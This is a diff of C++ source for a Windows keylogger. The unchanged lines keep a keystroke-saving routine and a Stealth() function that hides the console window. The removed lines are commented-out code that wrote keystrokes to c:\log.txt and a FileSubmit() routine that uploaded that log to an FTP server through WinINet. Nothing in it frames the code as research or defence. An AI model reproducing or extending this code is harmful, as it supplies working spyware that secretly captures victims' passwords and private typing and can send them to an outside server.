@@ -1,16 +1,8 @@
 #pragma once
 #ifndef _CRT_SECURE_NO_WARNINGS
 #ifndef INTERNET_FLAG_PASSIVE
-/*#ifndef InternetOpenW
-#ifndef InternetConnectW
-#ifndef FtpPutFileW
-#ifndef InternetCloseHandle*/
 #define _CRT_SECURE_NO_WARNINGS
-/*#define INTERNET_FLAG_PASSIVE
-#define InternetOpenW
-#define InternetConnectW
-#define FtpPutFileW
-#define InternetCloseHandle*/
+
 #pragma comment (lib, "wininet.lib")
 #include <iostream>
 #include <fstream>
@@ -21,15 +13,7 @@
 using namespace std;
 int Save(int key_stroke, char *file);
 void Stealth();
-/*void FileSubmit();*/
 
-/*int KeyLog(char key)
-{
-ofstream keylog("c:\\log.txt", ios::app);
-keylog << key;
-keylog.close();
-return 0;
-}*/
 int main()
 {
 	Stealth();
@@ -109,24 +93,8 @@ void Stealth()
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(Stealth, 0);
 }
-/*
-void FileSubmit()
-{
-HINTERNET hInternet;
-HINTERNET hFtpSession;
-hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-hFtpSession = InternetConnect(hInternet, "", INTERNET_DEFAULT_FTP_PORT, "", " ", INTERNET_SERVICE_FTP, 0, 0);
-FtpPutFile(hFtpSession, "C:\\log.txt", "mylog.txt", FTP_TRANSFER_TYPE_BINARY, 0);
-
-InternetCloseHandle(hFtpSession);
-InternetCloseHandle(hInternet);
-}
-*/
 
 #endif _CRT_SECURE_NO_WARNINGS
 
 #endif INTERNET_FLAG_PASSIVE
-/*#endif InternetOpenW
-#endif InternetConnectW
-#endif FtpPutFileW
-#endif InternetCloseHandle*/
+
